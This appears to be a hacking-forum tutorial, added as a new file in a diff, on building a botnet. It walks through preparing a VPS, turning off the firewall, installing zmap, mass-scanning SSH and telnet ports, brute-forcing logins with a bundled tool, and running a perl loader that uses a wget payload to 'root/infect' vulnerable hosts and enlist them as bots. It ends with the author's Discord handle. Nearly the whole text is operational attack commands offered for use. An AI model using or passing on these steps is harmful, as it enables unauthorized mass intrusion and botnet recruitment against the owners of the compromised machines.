@@ -1,0 +1,52 @@
+• ~ ZMAP SCANNING, BRUTING, AND LOADING SSH TUTORIAL BY TNXL HK ~
+•Requirements: Dedicated Server/VPS running on Centos6.x with at least 2-64GB RAM, 1-X amount of cores, 1-10GBPS Port/Connection speed. Winscp, Putty/Kitty/MobaXterm/some ssh client.
+•I recommend you to use Digital Ocean, HostSale.net, or Electra servers: https://hackforums.net/showthread.php?tid=5896803 for scanning.
+•First off, run these commands below.
+yum update -y
+yum install gcc nano cpan perl perl-CPAN python python-paramiko python-requests dos2unix screen unzip git wget -y
+yum -y install glibc.i686
+yum install epel-release -y
+yum install perl-Net-OpenSSH -y
+yum install perl-Net-SSH perl-Parallel-ForkManager -y
+yum install perl-Net-SSH2 -y
+service iptables stop
+chkconfig iptables off
+ulimit -n 999999
+ulimit -u 999999
+sysctl -w fs.file-max=999999
+nano /usr/include/bits/typesizes.h  [SCROLL DOWN Until you see the 1024, and change it to 999999]
+• Next you want to make a directory somewhere on the server such as 'scanning' or 'zmap', etc.
+cd /etc
+mkdir scanning
+cd scanning
+•Drag the zmap file from the archive you downloaded in the description to the scanning directory on the server.
+• Run these commands below:
+chmod 770 zmap
+./zmap
+• The zmap file/executable is the zmap auto installer, it will take a few secs to install everything just be patient.
+• When zmap is finished installing, you are then ready to scan/brute/load ssh, some rce exploits, and many other exploits.
+• Now we scan, brute, and load.
+
+• TO SCAN
+• To scan for ssh use port 22, for telnet use port 23, other exploits are on different ports. Do your homework to find out more.
+
+screen zmap -p [PORT] -w [Your lst file] -o [your file to output to]
+
+Examples: 
+          chmod 770 *     >>>> Give permissions/privileges to all files in the scanning directory. ONCE!!! do ls to see if the files are green. You chmod executables that don't have the permission to be executed/read/ or the permission for them to write to the system.
+		  screen zmap -p 22 -w tnxl.lst -o bios.txt
+		  • WE SCREEN IT TO KEEP IT RUNNING in the background, so when we close our terminal/connection, zmap will still do its job until its finished.
+          • In my previous video, I showed you guys how to create screens and attach/reattach to them. Look at the CNC tutorial for help.
+          cat bios.txt | sort | uniq > mfu.txt  >>>>> this sorts the ips in the bios.txt and cats them to the mfu.xtx
+		  ./update 1500               >>>>>>>>>> UPDATE is the ssh bruter. It automatically searches for the mfu.txt on execution.
+		  ./dup    >>>>>>> This clears all the dupes (we don't want dupes) from our vuln.txt and outputs the new vulnerable hosts to a file named 'vuln'.
+		  perl tnxl.pl vuln    >>>> Here we load/root/infect the vulnerable hosts to our net. Make sure you put your payload where its says 'WGET/PAYLOAD' in tnxl.pl. Or your bots will not connect to your net.	
+
+• BANG! Your done. Now you can repeat this process with different exploits/ranges/lsts/ or what ever you desire. If you need help, my Discord is Dez#9228		  
+
+
+THANK YOU FOR WATCHING!!!
+		  
+		  
+
+ 
